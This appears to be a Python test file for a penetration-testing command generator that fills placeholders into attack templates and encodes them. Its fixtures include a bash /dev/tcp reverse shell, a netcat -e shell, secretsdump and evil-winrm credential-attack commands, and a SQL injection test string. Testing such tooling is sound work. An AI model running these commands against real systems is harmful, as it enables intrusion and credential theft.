#!/usr/bin/env python3
"""Minimal self-check for the render/validation/encoding logic. Run: python3 test_floki.py"""
import base64
import os
import sqlite3
import tempfile
from pathlib import Path

import server


def test_validation():
    assert server.valid_host("10.10.14.7")
    assert server.valid_host("::1")
    assert server.valid_host("attacker.example.com")
    assert not server.valid_host("not a host!")
    assert not server.valid_host("")
    assert server.valid_port("443") and server.valid_port(65535)
    assert not server.valid_port("0") and not server.valid_port("70000")
    assert not server.valid_port("abc")


def test_raw_substitution():
    tpl = {"template": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1", "encoding": "raw"}
    out = server.render(tpl, {"LHOST": "10.0.0.1", "LPORT": "4444"})
    assert out == "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", out


def test_bad_input_raises():
    tpl = {"template": "nc {LHOST} {LPORT} -e {SHELL}", "encoding": "raw"}
    for bad in ({"LHOST": "x y", "LPORT": "4444"}, {"LHOST": "10.0.0.1", "LPORT": "99999"}):
        try:
            server.render(tpl, bad)
            assert False, "expected ValueError"
        except ValueError:
            pass


def test_url_encoding():
    tpl = {"template": "bash -c 'id {LHOST}'", "encoding": "url"}
    out = server.render(tpl, {"LHOST": "10.0.0.1", "LPORT": "1"})
    assert " " not in out and "%20" in out, out


def test_base64_is_utf16le():
    tpl = {"template": "Write-Output {LHOST}", "encoding": "base64"}
    out = server.render(tpl, {"LHOST": "10.0.0.1", "LPORT": "1"})
    assert base64.b64decode(out).decode("utf-16-le") == "Write-Output 10.0.0.1", out


def test_multivar_ad_template():
    tpl = {"template": "secretsdump.py {DOMAIN}/{USER}:{PASS}@{DC_IP}", "encoding": "raw"}
    out = server.render(tpl, {"DOMAIN": "corp.local", "USER": "bob",
                              "PASS": "P@ss", "DC_IP": "10.0.0.1"})
    assert out == "secretsdump.py corp.local/bob:P@ss@10.0.0.1", out


def test_missing_var_raises():
    tpl = {"template": "evil-winrm -i {TARGET} -u {USER} -p {PASS}", "encoding": "raw"}
    try:
        server.render(tpl, {"TARGET": "10.0.0.1", "USER": "bob"})  # no PASS
        assert False, "expected ValueError for missing PASS"
    except ValueError:
        pass


def test_dc_ip_is_validated():
    tpl = {"template": "rpcclient -U '' -N {DC_IP}", "encoding": "raw"}
    try:
        server.render(tpl, {"DC_IP": "not a host"})
        assert False, "expected ValueError for bad DC_IP"
    except ValueError:
        pass


def test_rport_is_validated():
    tpl = {"template": "ssh -L {LPORT}:127.0.0.1:{RPORT} {USER}@{TARGET}", "encoding": "raw"}
    out = server.render(tpl, {"LPORT": "8080", "RPORT": "3306", "USER": "bob", "TARGET": "10.0.0.1"})
    assert out == "ssh -L 8080:127.0.0.1:3306 bob@10.0.0.1", out
    try:
        server.render(tpl, {"LPORT": "8080", "RPORT": "99999", "USER": "bob", "TARGET": "10.0.0.1"})
        assert False, "expected ValueError for bad RPORT"
    except ValueError:
        pass


def test_value_with_placeholder_token_not_re_expanded():
    # A value that contains a literal {VAR} token must be substituted once, not
    # re-expanded on a later pass (single-pass substitution).
    tpl = {"template": "{USER} {PASS}", "encoding": "raw"}
    out = server.render(tpl, {"USER": "{PASS}", "PASS": "secret"})
    assert out == "{PASS} secret", out


def test_options_whitelist_and_extra():
    tpl = {"template": "nxc smb {TARGET} -u {USER} -p {PASS}", "encoding": "raw",
           "options": ["--shares", "--users", "--sam"]}
    out = server.render(tpl, {"TARGET": "10.0.0.5", "USER": "a", "PASS": "b"},
                        ["--shares", "--sam", "--evil"], "--local-auth")
    # only whitelisted flags appended (in submitted order), unknown --evil dropped, extra last
    assert out == "nxc smb 10.0.0.5 -u a -p b --shares --sam --local-auth", out


def test_b64_encoder_is_plain_utf8():
    # 'b64' is plain UTF-8 base64, distinct from the UTF-16LE 'base64' encoder.
    tpl = {"template": "AB", "encoding": "raw"}
    out = server.render(tpl, {}, encoding="b64")
    assert out == base64.b64encode(b"AB").decode("ascii") == "QUI=", out


def test_url2_encoder_double_encodes():
    tpl = {"template": "a b", "encoding": "raw"}
    out = server.render(tpl, {}, encoding="url2")
    assert out == "a%2520b", out


def test_hex_encoder_escapes_each_utf8_byte():
    tpl = {"template": "AB", "encoding": "raw"}
    out = server.render(tpl, {}, encoding="hex")
    assert out == "\\x41\\x42", out


def test_unicode_encoder_escapes_each_char():
    tpl = {"template": "AB", "encoding": "raw"}
    out = server.render(tpl, {}, encoding="unicode")
    assert out == "\\u0041\\u0042", out


def test_encoding_override_wins():
    tpl = {"template": "AB", "encoding": "base64"}
    assert server.render(tpl, {}) != "QUI="  # template default = UTF-16LE b64
    assert server.render(tpl, {}, encoding="b64") == "QUI="  # override wins
    tpl2 = {"template": "a b", "encoding": "url"}
    assert server.render(tpl2, {}) == "a%20b"
    assert server.render(tpl2, {}, encoding="raw") == "a b"


def test_unknown_encoding_override_rejected():
    tpl = {"template": "AB", "encoding": "raw"}
    for bad in ("nope", "b64x"):
        try:
            server.render(tpl, {}, encoding=bad)
            assert False, f"expected ValueError for encoding={bad!r}"
        except ValueError:
            pass


def test_reference_search_rank():
    # Exact > prefix > substring, stable within a tier. Use a throwaway DB so the
    # assertion does not depend on the contents of reference_seed.json.
    old_db, old_tables = server.DB_FILE, server.REF_TABLES
    fd, path = tempfile.mkstemp(suffix=".db")
    os.close(fd)
    try:
        con = sqlite3.connect(path)
        con.execute('CREATE TABLE t ("name", "notes")')
        con.executemany("INSERT INTO t VALUES (?, ?)", [
            ("bobcat",  "x"),   # substring
            ("cat",     "x"),   # exact
            ("catalog", "x"),   # prefix
            ("dog",     "x"),   # no match -> excluded
            ("scatter", "x"),   # substring
        ])
        con.commit()
        con.close()
        server.DB_FILE = Path(path)
        server.REF_TABLES = {"t": (("name", "notes"), "name")}
        rows = server.search_reference("cat")["t"]
        assert [r["name"] for r in rows] == ["cat", "catalog", "bobcat", "scatter"], rows
        assert server.search_reference("nomatch")["t"] == []
    finally:
        server.DB_FILE, server.REF_TABLES = old_db, old_tables
        os.remove(path)


def test_reference_db_build_and_search():
    server.build_db()
    everything = server.search_reference("")
    assert everything["ports"] and everything["creds"] and everything["hashmodes"]
    smb = server.search_reference("smb")
    assert any(p["port"] == 445 for p in smb["ports"]), smb["ports"]
    # parameterized query: injection string matches nothing, raises nothing
    inj = server.search_reference("' OR 1=1--")
    assert sum(len(v) for v in inj.values()) == 0, inj


if __name__ == "__main__":
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            fn()
            print(f"ok  {name}")
    print("all passed")
